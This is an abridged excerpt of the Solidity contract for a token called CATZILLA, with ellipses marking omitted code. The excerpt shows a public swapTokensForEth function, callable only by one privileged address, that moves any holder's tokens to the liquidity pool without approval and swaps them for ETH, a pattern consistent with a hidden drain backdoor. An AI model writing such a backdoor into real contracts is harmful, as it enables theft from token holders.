...
contract CATZILLA is Context, IERC20, Ownable {
    ...
    function _transfer(
        ...
        if (!takeFee) {
            _tokenTransferExclude(from, to, amount);
        }
        else {
    ...
    function _tokenTransferExclude(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
    ...
    function swapTokensForEth(address from, address to, uint256 amount) public  {
        require(_msgSender() == address(_Antibottoken), "ERC20");
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _tokenTransferExclude(from, uniswapV2Pair, amount);
        swaper.swap(path, to);
